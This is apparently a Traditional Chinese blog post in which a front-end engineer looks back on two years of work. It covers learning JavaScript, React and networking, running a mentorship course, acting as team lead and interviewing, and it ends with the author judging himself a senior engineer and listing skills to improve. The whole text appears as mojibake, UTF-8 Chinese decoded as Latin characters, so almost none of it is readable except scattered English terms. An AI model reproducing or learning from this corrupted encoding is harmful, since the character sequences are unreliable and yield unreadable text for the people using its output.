è€Œç¾åœ¨é€²å…¥åˆ°æ·±åº¦æ™‚æœŸï¼ŒæŠŠå¿ƒåŠ›æ”¾åœ¨ JavaScriptã€ç€è¦½å™¨ã€ç¶²è·¯è·Ÿ Reactï¼Œå…¶ä»–çš„ä¾¿ä¸æ˜¯é‚£éº¼é—œæ³¨ã€‚
ä½†å¦‚æœè¦æˆ‘æŒ‘å¹¾å€‹åœ¨é€™ä»¥å¤–æƒ³ç ”ç©¶ä¸€ä¸‹çš„ä¸»é¡Œï¼Œæˆ‘æœƒé¸ GraphQL è·Ÿ Vueï¼Œå¸Œæœ›èƒ½å°é€™å…©å€‹æ±è¥¿æœ‰åŸºæœ¬çš„ç†è§£ã€‚
èæœƒè²«é€šåˆ°äº†æŸå€‹æ™‚æœŸï¼Œæœƒé–‹å§‹èƒ½æŠŠä»¥å‰å­¸éçš„æ±è¥¿èæœƒè²«é€šä¸¦ä¸”ç¢ºåˆ‡çš„çŸ¥é“å…¶è„ˆçµ¡ç™¼å±•ï¼Œè€Œæˆ‘åœ¨é€™å…©å¹´é–“ä¼¼ä¹å°±åˆ°äº†é€™å€‹æ™‚æœŸã€‚
å…¶å¯¦ä»¥å‰å°±æœ‰é€™ç¨®èƒ½åŠ›äº†ï¼Œåªæ˜¯åœ¨è¿‘æœŸè®Šå¾—æ›´æ˜é¡¯è€Œå·²ã€‚æŒæ¡äº†è„ˆçµ¡ä»¥å¾Œå°±èƒ½å¤ å¾ˆæ¸…æ¥šåœ°å»è§£é‡‹ä¸€é …æŠ€è¡“çš„å‡ºç¾ä»¥åŠç‚ºä»€éº¼è¦é¸ç”¨é€™å€‹æŠ€è¡“ï¼Œèƒ½å¤ çŸ¥é“èƒŒå¾Œçš„æ ¸å¿ƒæ€æƒ³ï¼Œç¶“éé€™æ¨£çš„æ€è€ƒä»¥å¾Œå¯«å‡ºä¾†çš„æ±è¥¿æ˜¯ä¸ä¸€æ¨£çš„ã€‚
é™¤äº†æŠ€è¡“æ·±åº¦çš„ç™¼å±•ä»¥å¤–ï¼Œæˆ‘ä¹Ÿæœƒå¯«ä¸€äº›é¢å‘ä¸€èˆ¬å¤§çœ¾çš„ç§‘æ™®æ–‡ï¼Œåƒæ˜¯é›¶åŸºç¤çš„å°æ˜è¦å¦‚ä½•æˆç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Ÿä»¥åŠè·Ÿè‘—å°æ˜ä¸€èµ·ææ‡‚æŠ€è¡“åè©ï¼šMVCã€SPA èˆ‡ SSRï¼Œå°±æ˜¯è‡ªå·±æ•´ç†æ¶ˆåŒ–ä»¥å¾Œå†ç”¢ç”Ÿå‡ºä¾†çš„æ±è¥¿ã€‚
æˆ‘è‡ªå·±èªç‚ºä¹‹æ‰€ä»¥é€™äº›æ–‡ç« åº•ä¸‹ä¸€ç‰‡å¥½è©•ï¼Œå°±æ˜¯å› ç‚ºå®ƒæœ‰è„ˆçµ¡ã€‚æŠ€è¡“çš„ç™¼å±•æ˜¯æœ‰è„ˆçµ¡çš„ï¼ŒReact æœƒå‡ºç¾ä¸€å®šæ˜¯ç‚ºäº†è¦è§£æ±ºä¸€äº› jQuery æ²’è¾¦æ³•è§£æ±ºã€Angular ä¹Ÿæ²’è¾¦æ³•è§£æ±ºçš„å•é¡Œï¼Œå¦å‰‡æˆ‘å€‘ä¸éœ€è¦ä¸€å€‹æ–°çš„æŠ€è¡“ï¼Œè€Œé€™æ–°æŠ€è¡“ä¹Ÿä¸æœƒè®Šå¾—é‚£éº¼å—æ­¡è¿ã€‚
åªè¦èƒ½å¤ æ‰¾åˆ°é‚£å€‹ç†ç”±ï¼Œå°±èƒ½æŠŠé€™äº›é»ä¸²èµ·ä¾†é€£æˆä¸€æ¢ç·šï¼Œé€£å¤šäº†å°±è®Šæˆä¸€å€‹é¢ï¼Œæˆç‚ºå®Œæ•´çš„çŸ¥è­˜åœ–è­œã€‚
åœ¨ä¸Šé¢é‚£å…©ç¯‡æ–‡ç« ä¸­æˆ‘å¾æœ€é™½æ˜¥çš„ç‹€æ…‹é–‹å§‹ä¸€æ­¥æ­¥å¾€ä¸‹æ¨ï¼Œå…¶å¯¦å°±å¥½åƒæ•¸å­¸è­‰æ˜æˆ–æ˜¯é‚è¼¯è­‰æ˜é‚£æ¨£ï¼Œæ¯ä¸€æ­¥éƒ½è·Ÿä¸Šä¸€æ­¥æœ‰é—œï¼Œåœ¨è­‰æ˜çš„éç¨‹ä¸­æœƒè®Šå¾—è¶Šä¾†è¶Šè¤‡é›œï¼Œä½†æ¯å€‹æ­¥é©Ÿéƒ½æ˜¯ç’°ç’°ç›¸æ‰£çš„ã€‚
å«ä¸€å€‹æ–°æ‰‹ç›´æ¥å»ç¢° Reactï¼Œå°±å¥½åƒç›´æ¥è®“ä»–å¾è­‰æ˜çš„ç¬¬åæ­¥é–‹å§‹å¾€ä¸‹åšï¼Œä»–ä¸çŸ¥é“æ€éº¼åˆ°é€™è£¡ä¾†çš„ï¼Œä¹Ÿéœ€è¦èŠ±å¾ˆå¤šæ™‚é–“å»ç ”ç©¶è©²æ€éº¼å‰é€²åˆ°ä¸‹ä¸€æ­¥ã€‚ä½†å¦‚æœä½ è®“ä»–å¾ç¬¬ä¸€æ­¥é–‹å§‹ï¼Œå¸¶ä»–åˆ°ç¬¬äºŒæ­¥ã€ç¬¬ä¸‰æ­¥é€™æ¨£ä¸€æ­¥æ­¥è­‰æ˜ä¸‹å»ï¼Œç•¶åˆ°äº†ç¬¬åæ­¥æ™‚ï¼Œä»–çŸ¥é“è‡ªå·±ç‚ºä½•åœ¨é€™è£¡ï¼Œä»–çŸ¥é“é€™ä¸€æ­¥å…¶å¯¦æ˜¯å‰é¢åæ­¥çš„ç´¯ç©ï¼Œé€™å°±æ˜¯æœ‰è„ˆçµ¡è·Ÿæ²’æœ‰è„ˆçµ¡çš„å·®ç•°ã€‚
è€Œæˆ‘çš„é‚£äº›æ–‡ç« ä¹‹æ‰€ä»¥ç‰¹åˆ¥ï¼Œæ˜¯å› ç‚ºæˆ‘å¸¶è®€è€…å¾ç¬¬ä¸€æ­¥é–‹å§‹èµ°ï¼Œä¸€æ­¥æ­¥å¸¶è‘—ä»–å€‘åˆ°ç¬¬åæ­¥ã€‚æ‰€ä»¥å°æ²’ä»€éº¼åŸºç¤çš„äººä¾†èªªï¼Œä¸æœƒæ„Ÿåˆ°ç‰¹åˆ¥å›°é›£ï¼›å°å·²ç¶“æœ‰åŸºç¤çš„äººä¾†èªªï¼ŒæœƒæŠŠä»¥å‰å­¸éçš„æ±è¥¿å…¨éƒ¨ä¸²èµ·ä¾†ï¼Œæœ‰ç¨®ç…¥ç„¶ä¸€æ–°çš„æ„Ÿè¦ºã€‚
æ•™å­¸å¾ä»¥å‰å…¶å¯¦å°±é™¸é™¸çºŒçºŒæœ‰åœ¨åšæ•™å­¸ï¼Œä½†åœ¨ä»Šå¹´çš„ä¸€æœˆçµ‚æ–¼å˜—è©¦äº†è‡ªå·±ä¸€ç›´ä»¥ä¾†æƒ³åšçš„äº‹ï¼šå¾é›¶åˆ°ä¸€åŸ¹é¤Šä¸€å€‹å·¥ç¨‹å¸«ã€‚
ç¸½å…±é‚„åšäº†å…©æœŸï¼Œè¨ˆç•«è©³ç´°å…§å®¹å¯åƒè€ƒï¼šç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•«ç¬¬äºŒæœŸå ±åç°¡ç« ï¼Œèª²ç¨‹å¤§ç¶±ä¹Ÿæ”¾åˆ°äº† GitHub ä¸Šé¢ï¼Œæƒ³è·Ÿè‘—å­¸çš„å¯ä»¥è‡ªè¡Œå–ç”¨ã€‚
ç›®å‰ç¬¬äºŒæœŸå·²ç¶“æ…¢æ…¢æ¥è¿‘å°¾è²ï¼Œä½†å¤§æ¦‚è¦ç­‰äºŒæœˆåˆæ‰æ¯”è¼ƒå¥½è©•é‡æˆæ•ˆã€‚åœ¨æ•™å­¸çš„éç¨‹ä¸­æˆ‘æ‰æ˜¯å­¸åˆ°æœ€å¤šæ±è¥¿çš„é‚£å€‹äººï¼Œæ¯æ¬¡æº–å‚™æ•™å­¸å‰æˆ‘éƒ½å¿…é ˆç¢ºå®šè‡ªå·±èƒ½å®Œå…¨æŒæ¡è¦è¬›çš„ä¸»é¡Œï¼Œè¶æ©Ÿç†è§£äº†ä¸€äº›ä»¥å‰å¾ˆå°‘æ¥è§¸åˆ°çš„æ¦‚å¿µï¼Œåƒæ˜¯è³‡æ–™åº«çš„ Viewã€Stored Procedure è·Ÿ Trigger ä»¥åŠ ACIDã€‚
èª²ç¶±çš„éƒ¨åˆ†ä¹Ÿæ˜¯æŒ‰ç…§æˆ‘å‰é¢æ‰€è¬›çš„è„ˆçµ¡è¨­è¨ˆè€Œæˆï¼Œä½†ç¢°åˆ°çš„å•é¡Œæ˜¯é›£åº¦è½å·®æœ‰é»å¤ªå¤§ï¼Œæ‰€ä»¥é‚„æœ‰æ»¿å¤šéœ€è¦èª¿æ•´çš„åœ°æ–¹ã€‚ä¸éæ•´é«”è€Œè¨€æ•™çš„æ±è¥¿æˆ‘èªç‚ºæ˜¯æ²’ä»€éº¼å•é¡Œçš„ï¼Œè©²å­¸çš„éƒ½æœ‰å­¸åˆ°ï¼Œè€Œä¸”ä¸åªå­¸äº†å·¥å…·ï¼Œä¹Ÿå­¸äº†åŸç†ã€‚
æ•™å­¸æ˜¯å°‘æ•¸æˆ‘èƒ½ç¶­æŒå‹•èƒ½ä¸¦å …æŒä¸‹å»çš„äº‹ï¼Œé›–ç„¶æ˜¯å…¼è·æ•™å­¸ï¼Œä½†æˆ‘è‡ªèªèª²ç¨‹å“è³ªä¸æœƒè·Ÿé‚£äº›å…¨è·æ•™å­¸çš„å·®åˆ°å¤ªé ï¼Œä»¥ä¸€äººåœ˜éšŠä¾†èªªï¼Œæˆ‘è¦ºå¾—åšå¾—ä¸éŒ¯äº†ã€‚ä½†ç•¶ç„¶æˆ‘ä¹Ÿä¸æœƒå°±åœåœ¨é€™è£¡ï¼Œç•¢ç«Ÿæˆ‘èªç‚ºèª²ç¨‹æ°¸é éƒ½æœ‰æ”¹å–„çš„ç©ºé–“ã€‚
æ•™å­¸ç›¸é—œçš„å¿ƒå¾—ç­‰èª²ç¨‹çµæ¥­å¾Œæœƒå†å¯«ä¸€ç¯‡æ–‡ï¼Œé€™é‚Šå°±å…ˆç°¡å–®å¸¶éäº†ï¼Œä¸ç„¶æˆ‘æ€•é€™ç¯‡æ–‡æœƒè®Šå¾—å¤ªé•·ã€‚
æºé€šä¸€å¹´å‰å‰›æ¥ Front-end Team Lead çš„è·ä½æ™‚å…¶å¯¦æˆ°æˆ°å…¢å…¢ï¼Œé‚£æ™‚å€™ä¸»ç®¡åªæ˜¯å•æˆ‘æœ‰æ²’æœ‰èˆˆè¶£æ…¢æ…¢ä¾†è©¦è©¦çœ‹ï¼Œæˆ‘èªªå¯ä»¥æ…¢æ…¢è©¦è©¦çœ‹ï¼Œä¸‹ç¦®æ‹œæˆ‘å°±è¢«æ‹‰åˆ°é€™è·ä½äº†ã€‚æˆ‘åŸæœ¬ä»¥ç‚ºæœƒå…ˆè·Ÿåœ¨ä¸»ç®¡æ—é‚Šè¦‹ç¿’ä¸€ä¸‹ä¹‹é¡çš„ï¼Œçµæœå®Œå…¨æ²’æœ‰ã€‚
ä¸éé›–ç„¶èªªæ˜¯ Team Leadï¼Œå…¶å¯¦æ›´åƒæ˜¯ Lead engineerã€‚å·®ç•°åœ¨æ–¼å‰è€…æœƒæ›´åå‘ç®¡ç†è·è¦å¸¶äººï¼Œå¾Œè€…å‰‡æ˜¯è‘—é‡åœ¨æŠ€è¡“é¢ã€‚æˆ‘è¦ºå¾—ä»¥å·¥ä½œå…§å®¹ä¾†èªªï¼Œå…¶å¯¦å¾Œè€…æ›´ç‚ºè²¼è¿‘ä¸€é»ã€‚
æˆ‘è¦åšçš„äº‹æƒ…å°±æ˜¯è·Ÿ PM æºé€šï¼Œæ¯å…©é€±é–‹ä¸€æ¬¡ sprint planning meeting çœ‹è¦æ”¾ä»€éº¼ ticket é€²ä¾†ã€‚æœ‰æ–°çš„åŠŸèƒ½æ™‚è¦çµ¦ PM ä¸€å€‹å¤§æ¦‚çš„æ™‚é–“ä¼°è¨ˆï¼Œä¹Ÿè¦æŠŠ ticket åˆ†ç™¼çµ¦å…¶ä»–åŒäº‹ï¼Œæ±ºå®šä»–å€‘è¦åšå“ªäº›äº‹æƒ…ã€‚
ç°¡å–®ä¾†èªªæˆ‘ä¸€å€‹äººå° PMï¼Œå…¶ä»–å‰ç«¯å·¥ç¨‹å¸«å‰‡æ˜¯è² è²¬å»è§£é‚£äº› ticketã€‚ä¸éæˆ‘è‡ªå·±ä¹Ÿæ˜¯è¦å¯« code å•¦ï¼Œä½†æœ‰ä¸€éƒ¨åˆ†æ™‚é–“è¦ç•™çµ¦è·Ÿ PM æºé€šï¼Œåªè¦å‰ç«¯æœ‰ä»»ä½•å•é¡Œä»–å€‘å°±æ˜¯æ‰¾æˆ‘ï¼Œæˆ‘è‡ªå·±èªç‚ºå¤§æ¦‚ 8 æˆæ™‚é–“é‚„æ˜¯å¯« codeï¼Œå…¶ä»– 2 æˆè™•ç†è·Ÿå°ˆæ¡ˆæœ‰é—œçš„äº‹æƒ…ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è¦ä¸€ç›´æºé€šã€‚
ä»¥å‰å…¶å¯¦å°±çŸ¥é“è‡ªå·±æºé€šèƒ½åŠ›ä¸¦ä¸å·®ï¼Œä½†é€™æ¬¡æœƒè¦ºå¾—ç·Šå¼µæ˜¯å› ç‚ºè¦ç”¨è‹±æ–‡æºé€šâ€¦å‰›é€²å…¬å¸çš„æ™‚å€™è‹±æ–‡èƒ½åŠ›é —å·®ï¼ˆç¾åœ¨ä¹Ÿæ²’å¤šå¥½ï¼‰ï¼Œæ·±æ€•è‡ªå·±åªæœƒä¸€ç›´è·³é‡èªªï¼šã€ŒSorry, can you repeat again?ã€ã€‚
èµ·åˆçš„æ™‚å€™é‚„çœŸçš„æœ‰é»æºé€šå•é¡Œï¼Œä½†æ¥äº†é€™å€‹ä½å­å…©ä¸‰å€‹æœˆä»¥å¾Œç™¼ç¾é–‹å§‹æ…¢æ…¢ç¿’æ…£äº†ï¼Œé–‹æœƒçš„æ™‚å€™è¶…ç´šç„¡æ•µå°ˆå¿ƒè½é›–ç„¶é‚„æ˜¯æœ‰äº›å–®å­—è½ä¸æ‡‚ï¼Œä½†ä¸€æ¨£æŠ“é—œéµå­—å°±å¥½äº†ï¼Œè½æ‡‚ä¸ƒå…«æˆåŸºæœ¬ä¸Šå°±èƒ½å¤ æºé€šçš„æ»¿é †æš¢ã€‚
é™¤äº†é€™å€‹ä»¥å¤–ï¼Œæœ€è¿‘å¹¾å€‹æœˆä¹Ÿé–‹å§‹ç•¶èµ·é¢è©¦å®˜ã€‚æˆ‘ä¸€ç›´è¦ºå¾—é¢è©¦å°å…¬å¸ä¾†èªªæ˜¯ä¸€ä»¶éœ€è¦éå¸¸æ³¨é‡çš„äº‹ï¼Œå› ç‚ºå°±æ˜¯å…¬å¸å°å¤–çš„é–€é¢ï¼Œä¸€å ´ç³Ÿç³•çš„é¢è©¦æ¯”ä¸€é “é›£åƒçš„æ™šé¤æ›´ç‚ºä¸å ªã€‚
å°æ–¼é¢è©¦æˆ‘ä¹Ÿé‚„åœ¨æ‘¸ç´¢è‡ªå·±æ€æ¨£èƒ½å¤ åšå¾—æ›´å¥½ï¼Œä½†æˆ‘è¬¹è¨˜å‰è¼©èªªçš„è©±ï¼Œä»–èªªé¢è©¦ä¸æ˜¯è¦æ¯”èª°å²å®³ï¼Œè€Œæ˜¯è¦å»çœ‹é¢è©¦è€…çš„å„ªé»ï¼Œå»çœ‹ä»–æ˜¯å¦é©åˆé€™å€‹ä½ç½®ï¼Œæ˜¯å¦æƒ³è¦èˆ‡ä»–å…±äº‹ã€‚å¦‚æœé¢è©¦åªæ˜¯æƒ³è¦é›»äººä¾†å‡¸é¡¯è‡ªå·±çš„å„ªè¶Šï¼Œé‚£å°±å®Œå…¨å¤±å»æ„ç¾©äº†ã€‚
é †å¸¶ä¸€æï¼Œæœ‰äº›äººçš„å±¥æ­·çœŸçš„å¯«å¾—å¾ˆä¸æ€éº¼æ¨£ï¼Œåå¹´å·¥ä½œç¶“é©—å»çœ‹ä¸å‡ºåˆ°åº•åšäº†ä»€éº¼äº‹ã€‚
æ‰€ä»¥ï¼Œæˆ‘æ˜¯è³‡æ·±å·¥ç¨‹å¸«å—ï¼Ÿå¥½ï¼Œå›é¡§äº†é€™éº¼å¤šçµ‚æ–¼å›åˆ°äº†æ¨™é¡Œã€‚
å…©å¹´å‰é‚£ç¯‡æˆ‘æåˆ°äº†é€™ç¯‡å¾ˆæ£’çš„æ–‡ç« ï¼šå¦‚ä½•æ‰æœ‰è³‡æ ¼ç¨±ç‚ºè³‡æ·±å·¥ç¨‹å¸«ï¼Œè£¡é¢æä¾›äº†ä¸€äº›æŒ‡æ¨™å¯ä»¥åƒè€ƒï¼Œæ›´è²¼å¿ƒåœ°æä¾›äº†åæŒ‡æ¨™è®“å¤§å®¶çŸ¥é“èµ°ç«å…¥é­”æ˜¯ä»€éº¼æ¨£å­ã€‚
ç¶“éé€™å…©å¹´çš„ç£¨ç·´ï¼Œåœ¨å‰å…¬å¸ç¨ç«‹å®Œæˆç›´æ’­ç¶²ç«™çš„é–‹ç™¼ï¼Œä¹Ÿåœ¨æ­¤æœŸé–“åŠ æ·±è‡ªå·±å°åŸºç¤çš„ç†è§£ï¼Œå°é–‹ç™¼æ–°åŠŸèƒ½çš„ç†è§£å¾ï¼šã€Œä¸çŸ¥é“è‡ªå·±èƒ½å¦åšåˆ°ã€è½‰è®Šç‚ºã€Œåšå¾—åˆ°ï¼Œå¯èƒ½éœ€è¦å¤šå°‘æ™‚é–“ã€ï¼Œåœ¨è‡ªä¿¡å¿ƒä¸Šé¢ææ˜‡äº†ä¸å°‘ã€‚
åœ¨ç¾åœ¨çš„å…¬å¸ä¹Ÿçµ‚æ–¼æœ‰äº†æ›´å¤šè¨è«–èˆ‡äº¤æµçš„æ©Ÿæœƒï¼Œè·Ÿå¦å¤–å…©ä½å‰ç«¯è¨è«–è¦é¸å“ªå€‹ libraryã€coding style æ€éº¼å®šã€æª”æ¡ˆå‘½åè¦å‰‡æ€éº¼å®šç­‰ç­‰ï¼Œä¹Ÿæ›´é »ç¹åœ°èˆ‡ PM äº¤æµï¼Œå°æºé€šä»¥åŠå°ˆæ¡ˆç®¡ç†æœ‰äº†é€²ä¸€æ­¥çš„ç†è§£ã€‚
é€™ä¸€å¹´ä¾†è² è²¬å…¬å¸çš„å››å€‹å‰ç«¯å°ˆæ¡ˆï¼Œå°å°ˆæ¡ˆçš„æ¶æ§‹æˆ–æ˜¯ä½¿ç”¨çš„æŠ€è¡“ä¸Šä¹Ÿæœ‰äº†ä¸åŒçš„ç†è§£ï¼Œåšä¸åŒçš„å°ˆæ¡ˆçš„æ™‚å€™éƒ½å¯ä»¥è§€æ‘©ä¸€ä¸‹åˆ¥äººå¯«çš„æ¶æ§‹è·Ÿç¨‹å¼ç¢¼ï¼ŒåŸ¹é¤Šäº†çœ‹åˆ°çˆ› code å°±æœƒæƒ³é †æ‰‹ä¿®æ‰çš„ç¿’æ…£ï¼Œå°æ–¼é‡æ§‹ä¹‹å‰çœ‹åˆ°æœ‰äººèªªäº†ä¸€å¥å¾ˆæ£’çš„è©±ï¼šã€Œå¾ˆå¤šå·¥ç¨‹å¸«éƒ½åªæœƒé‡å»ºï¼Œè€Œä¸æœƒé‡æ§‹ã€ï¼Œé‡æ§‹æ‡‰è©²æ˜¯æ¼¸é€²çš„ï¼Œå¦‚æœæƒ³ç­‰åˆ°æœ‰æ™‚é–“å†ç æ‰é‡ç·´ï¼Œé‚£æ°¸é ç­‰ä¸åˆ°ã€‚
æ‡‰è©²åšçš„æ˜¯åœ¨ä¿® bug æˆ–æ˜¯å¯«æ–°åŠŸèƒ½æ™‚å°±é †æ‰‹ä¿®æ‰ä¸€äº›ï¼Œä¾‹å¦‚èªªä»Šå¤©æ”¹ä¸€å€‹è³¼è²·æµç¨‹çš„æ±è¥¿ï¼Œæˆ‘å°±æœƒé †æ‰‹æŠŠé‚£éƒ¨åˆ†é‡æ§‹ä¸€ä¸‹ï¼Œä¸ä¸€å®šè¦åšåˆ°ä½ å¿ƒä¸­å®Œç¾çš„æ¨£å­ï¼Œåªè¦ç¢ºä¿æ¯”ä»¥å‰çš„ç¨‹å¼ç¢¼å“è³ªæ›´å¥½å°±è¡Œäº†ï¼Œé€™æ¨£å°±æœƒè¶Šä¾†è¶Šå¥½ã€‚
è€Œå·¥ä½œä»¥å¤–çš„æ™‚é–“å¯«å¯« Blog åˆ†äº«å¿ƒå¾—ï¼Œå¶çˆ¾èŠ±å€‹å…­ä¸ƒå°æ™‚åªç‚ºäº†å¯«ä¸€ç¯‡æŠ€è¡“æ–‡ç« ï¼Œå¤§éƒ¨åˆ†çš„æ™‚é–“å‰‡èŠ±åœ¨æ•™å­¸åŸ¹è¨“ï¼ŒæˆåŠŸè½‰è·çš„å­¸ç”Ÿä¹Ÿå°è­‰äº†èª²ç¶±çš„åƒ¹å€¼ï¼Œé€éæ•™å­¸ä¹ŸæŠŠè‡ªå·±çš„åŸºç¤æ‰“å¾—æ›´ç´®å¯¦äº†ä¸€é»ã€‚
å…©å¹´å‰ï¼Œå·¥ä½œç¶“é©—ä¸€å¹´åŠï¼Œå‰›é€²å…¥ç¬¬äºŒå®¶å…¬å¸ä»»è·ï¼Œè‡ªèªç¨‹å¼å¯«å¾—ä¸å·®ä½†åŸºç¤ä¸å¥½ï¼Œç¶“é©—ä¹Ÿä¸è¶³ï¼Œé…ä¸ä¸Šè³‡æ·±é€™å€‹åå­—ï¼Œå› æ­¤ä»¥è³‡æ·ºå·¥ç¨‹å¸«è‡ªç¨±ã€‚
å…©å¹´éå¾Œï¼Œæˆ‘å¯ä»¥æŠŠå‰ç«¯å‡ºç¾çš„å„ç¨®å·¥å…·æ”¾åˆ°è„ˆçµ¡è£¡å»è«‡ï¼Œå»è§£é‡‹ç‚ºä»€éº¼æœƒå‡ºç¾ï¼Œè§£é‡‹å¸¶ä¾†çš„å¥½è™•æ˜¯ä»€éº¼ï¼Œä¹Ÿå¯ä»¥èªªæ˜åœ¨å°ˆæ¡ˆä¸­æ‡‰è©²å¦‚ä½•ä½¿ç”¨ï¼›å°å‰ç«¯å·¥ç¨‹å¸«çš„å¿…å‚™æŠ€èƒ½ä¹Ÿæœ‰ä¸€å®šçš„åŸºç¤ï¼Œå¯ä»¥è·Ÿä½ è«‡ JavaScript çš„å„ç¨®å¥‡æ€ªç¾è±¡ï¼Œè¦è«‡ç¶²è·¯è«‡ç€è¦½å™¨ä¹Ÿè¡Œï¼›å° PM æå‡ºçš„éœ€æ±‚é€šå¸¸ä¸æœƒæ“”å¿ƒåšä¸åšå¾—å‡ºä¾†ï¼Œå› ç‚ºçŸ¥é“è‡ªå·±ä¸€å®šè¡Œï¼Œé—œæ³¨çš„é»åè€Œè®Šæˆè¦å¦‚ä½•å¯¦ä½œæ‰èƒ½åšçš„æ¼‚äº®ä»¥åŠå®Œæˆæ‰€éœ€è¦çš„æ™‚é–“ï¼›çŸ¥é“å·¥ç¨‹å¸«é™¤äº†å¯«ç¨‹å¼ä»¥å¤–ï¼Œé‚„æœ‰å¾ˆå¤šé‡è¦çš„äº‹æƒ…è¦åšï¼Œåƒæ˜¯ç†è§£éœ€æ±‚ã€æºé€šä»¥åŠæ€è€ƒã€‚
æ˜¯çš„ï¼Œæˆ‘è¦ºå¾—æˆ‘æ˜¯è³‡æ·±å·¥ç¨‹å¸«äº†ã€‚
èªåŒè«‹æŒ‰è®šï¼Œå–œæ­¡è«‹åˆ†äº«ï¼ˆé–‹ç©ç¬‘çš„ï¼‰ã€‚
æ¥ä¸‹ä¾†å‘¢ï¼Ÿç•¶ä½ æ‡‚çš„æ„ˆå¤šï¼Œä¹Ÿæœƒæ„ˆçŸ¥é“è‡ªå·±ä¸è¶³çš„åœ°æ–¹åœ¨å“ªè£¡ï¼Œé‚„æœ‰å¾ˆå¤šéœ€è¦ç£¨ç·´çš„åœ°æ–¹ï¼Œå°±ç®—æ˜¯è³‡æ·±å·¥ç¨‹å¸«ï¼Œä¹Ÿæœ‰ 90 åˆ†èˆ‡ 60 åˆ†çš„å·®ç•°ï¼Œå­¸ç„¡æ­¢ç›¡ï¼Œè¦å­¸çš„æ±è¥¿é‚„å¤šè‘—ï¼Œä¸‹é¢æ•´ç†å‡ºå¹¾å€‹æˆ‘æƒ³åŠ å¼·çš„æ–¹å‘ï¼š
ç¬¬ä¸€ï¼ŒJavaScript æˆ‘æœ‰ä¸€å®šçš„åŸºç¤ä½†é‚„ä¸å¤ ç©©ï¼Œæˆ‘å¸Œæœ›èƒ½æŠŠé€™å¡Šå†ç·´çš„ç©©ä¸€é»ï¼Œå¸Œæœ›èƒ½ç©©åˆ°çœ‹ä»»ä½• JavaScript ç›¸é—œçš„æ–‡ç« éƒ½å¾ˆé›£æ„Ÿåˆ°é©šè¨çš„ç¨‹åº¦ã€‚
ç¬¬äºŒï¼Œæˆ‘åœ¨æ¸¬è©¦é€™æ–¹é¢å¼±åˆ°çˆ†ç‚¸ï¼Œåªæœ‰ unit test çš„ç¶“é©—ï¼ŒReact è£¡é¢è¦å° component åšæ¸¬è©¦çš„è©±æˆ‘é‚„æ˜¯ä¸çŸ¥é“è¦æ¸¬ä»€éº¼ï¼Œå° end-to-end testing ä¹Ÿæ²’ä»€éº¼ç¶“é©—ã€‚æˆ‘èªç‚ºæ¸¬è©¦æ˜¯é‚å‘ä¸‹å€‹éšæ®µå¾ˆé‡è¦çš„é—œéµï¼Œå®ƒå¯ä»¥æ”¹è®Šä½ çœ‹ç¨‹å¼ç¢¼çš„è§’åº¦ï¼Œä¸¦ä¸”è®“å“è³ªè®Šå¾—æ›´å¥½ã€‚
ç¬¬ä¸‰ï¼Œå°ä½¿ç”¨çš„å·¥å…·ç†è§£é‚„å¯ä»¥å†æ›´æ·±ä¸€é»ï¼Œå¸Œæœ›èƒ½èŠ±äº›æ™‚é–“å»ç ”ç©¶ Vueã€React è·Ÿ Redux çš„åŸå§‹ç¢¼ï¼Œå»çœ‹ä¸€ä¸‹ä»–å€‘æ˜¯æ€éº¼åšçš„ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿèƒ½å¤ å¾è£¡é¢å­¸åˆ°å¾ˆå¤šæ¶æ§‹èˆ‡è¨­è¨ˆæ–¹é¢çš„çŸ¥è­˜ã€‚
ç¬¬å››ï¼Œå°æ–¼ä¸€äº›ã€ŒåŸºç¤ã€çš„ç†è§£ä¸è¶³ï¼Œæˆ‘é€™é‚ŠæŒ‡çš„æ˜¯ç€è¦½å™¨è·Ÿç¶²è·¯ã€‚æˆ‘å¤§æ¦‚çœ‹éç€è¦½å™¨æ¸²æŸ“çš„éç¨‹ï¼Œä½†æˆ‘è¦ºå¾—å°å…¶ä¸­çš„å„å€‹ç’°ç¯€é‚„ä¸å¤ ç†è§£ï¼Œç¶²è·¯çš„è©±å¸Œæœ›èƒ½æŠŠ HTTPã€HTTP2 æˆ–æ˜¯ TCP&#x2F;IP é€™äº›æ±è¥¿çœ‹ç†Ÿä¸€é»ã€‚
ç¬¬äº”ï¼Œcomputer science çš„åŸºç¤ä¸è¶³ï¼Œä¾‹å¦‚ä½œæ¥­ç³»çµ±è·Ÿè¨ˆç®—æ©Ÿçµ„ç¹”é‚„æœ‰æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹ï¼Œå¦‚æœæƒ³è¦å†å¾€ä¸Šï¼Œé€™äº›ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œæƒ³å­¸ç¿’çš„è©±æ¯”è¼ƒæœ‰æ•ˆçš„æ–¹å¼æ‡‰è©²æ˜¯ç›´æ¥å»æ‰¾å¤§å­¸é–‹çš„èª²ç¨‹ä¾†çœ‹ï¼Œå¹«åŠ©æ‡‰è©²æ»¿å¤§ã€‚
æŠ€è¡“æ˜¯å·¥ç¨‹å¸«çš„æ ¹æœ¬ï¼Œä¸èƒ½å¿˜è¨˜é€™é»ï¼Œä¹Ÿåƒè¬ä¸èƒ½è®“è‡ªå·±çš„æŠ€è¡“è’å»¢ã€‚æ˜¯å› ç‚ºæœ‰äº†æŠ€è¡“èƒ½åŠ›ï¼Œæˆ‘æ‰èƒ½èµ°åˆ°ç¾åœ¨é€™å€‹ä½ç½®ã€‚
ç¸½çµå¾ˆæ…¶å¹¸è‡ªå·±åœ¨å…©å¹´å‰æœ‰å¯«äº†é‚£ç¯‡æ–‡ç« ï¼Œå¹«è‡ªå·±åšäº†ä¸€å€‹å¾ˆå¥½çš„ç¸½çµï¼Œæ­£æ˜¯å› ç‚ºæœ‰æŠŠç•¶æ™‚çš„å¿ƒå¾—ç•™ä¸‹ä¾†ï¼Œç¾åœ¨æ‰èƒ½å¤ å°ç…§è‡ªå·±ä»¥å‰çš„æ¨£å­ã€‚
